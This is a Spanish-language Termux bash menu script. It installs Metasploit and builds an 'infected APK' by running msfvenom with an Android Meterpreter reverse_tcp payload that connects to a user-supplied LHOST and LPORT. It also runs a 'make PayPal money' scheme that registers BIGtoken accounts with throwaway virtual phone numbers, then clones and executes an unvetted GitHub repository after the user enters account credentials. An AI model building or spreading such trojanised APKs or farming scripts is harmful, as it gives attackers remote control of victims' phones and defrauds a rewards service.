#!/bin/bash


rode="\e[31m"
ro="\e[1;31m"
ne="\e[30m"
gr="\e[1;30m"
azde="\e[34m"
az="\e[1;34m"
vede="\e[32m"
ve="\e[1;32m"
cede="\e[36m"
ce="\e[1;36m"
pude="\e[35m"
pu="\e[1;35m"
amde="\e[33m"
am="\e[1;33m"
grde="\e[37m"
bl="\e[1;37m"
re="\e[0m"

bgn="\033[40m"
bgr="\033[41m"
bgv="\033[42m"
bga="\033[43m"
bgaz="\033[44m"
bgm="\033[45m"
bgc="\033[46m"
bgb="\033[47m"



clear
printf "

 $bgr        $re     $bgr    $re     $bgr        $re  $bgr     $re
 $bgr   $re         $bgr  $re  $bgr  $re       $bgr  $re     $bgr  $re   $bgr  $re
 $bga   $re        $bga  $re    $bga  $re      $bga  $re     $bga  $re    $bga  $re
 $bga        $re  $bga  $re      $bga  $re     $bga  $re     $bga  $re    $bga  $re
       $bgv  $re  $bgv          $re     $bgv  $re     $bgv  $re    $bgv  $re
       $bgv  $re  $bgv  $re      $bgv  $re     $bgv  $re     $bgv  $re  $bgv  $re
 $bgc        $re  $bgc  $re      $bgc  $re  $bgc        $re  $bgc     $re"
echo
printf "
$ce[$ve 01$ce ]$am Instalar metasploit $re
$ce[$ve 02$ce ]$am Crear apk infectada $re
$ce[$ve 03$ce ]$am Ganar dinero PayPal $re
$ce[$ve 04$ce ]$am Reproductor YouTube $re
"
echo

if [ $1 -z ]; then
	read -p ">> " opc
else
	opc=$1
fi



case $opc in

01)
	printf "
$ve INICIANDO...$re"
pkg update -y
pkg upgrade -y
pkg install unstable-repo -y
pkg install metasploit -y
;;






02)
	printf "$am"
	read -p "LHOST:  " host
	read -p "LPORT:  " port
	read -p "Nombre (sin .apk):  " name
	printf "$re"
./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /sdcard/$name.apk
	echo
	echo
	printf "$ve [ + ]$am el apk se guardo en la ruta:

	/sdcard/$name.apk
	"
;;






03)
	printf "
$ve [ > ]$am Descarga la app$ve BIGtoken$am a continuacion...$re
$az presiona$ve ENTER$az para descargar$re"
read " >" xjd1762
termux-open https://play.google.com/store/apps/details?id=com.bigtoken.consumer
echo
echo
echo
printf "
$ve [ > ]$am Descarga la app$ve Text Plus$am a continuacion...$re
$az presiona$ve ENTER$az para descargar$re"
read " >" xjd1763
termux-open https://play.google.com/store/apps/details?id=com.gogii.textplus
clear
printf "
$ro AHORA SIGUE LOS PASOS$re

$ve [ paso 1 ]$az  Ve a Text Plus y create un nuevo numero virtual

$ve [ paso 2 ]$az Ve a BIGtoken y create una cuenta nueva colocando los datos que te solicitan y el numero virtual recien credo, ademas puedes usar el codigo de referido$bl DISBAN$az para evitar futuros problemas y ademas para que no empieces en cero puntos

$ve [ paso 3 ]$az A continuacion presiona$ve ENTER$az para continuar y seguido coloca el correo y contraseña de la cuenta de BIGtoken, Posterior a eso preciona la letra$am Y$az y das enter y despues preciona el numero$bl 2$az y das enter
$ro Nota;$grde Despues de cerrar termux, si quieres volver a generar dinero solo coloca el comando$pu bt$grde en tu terminal, y despues la letra$am Y$grde y enter y lueho el numero$am 2$grde y enter (haslo 1 vez cada 24 horas)

$ce presiona$ve ENTER$ce para continuar...$re"
cd; pkg update -y; pkg upgrade -y; pkg install git -y; git clone https://github.com/SaidGR/BIGtoken.git; cd BIGtoken; chmod 777 inc; ./inc
;;







04)
	pkg update -y
	pkg upgrade -y
	pkg install python
	pip install mps-youtube
	pip install youtube_dl
	apt install mpv
	printf "
$ve [ + ]$az Instalado con exito, cada vez que quieras escuchar musica solo coloca el comando$am mpsyt$az y para buscar los videos recuerda utilizar la barra inclinada. Ejemplo;
$grde
/nombre del video$re"
;;






05)
	cd
;;
esac
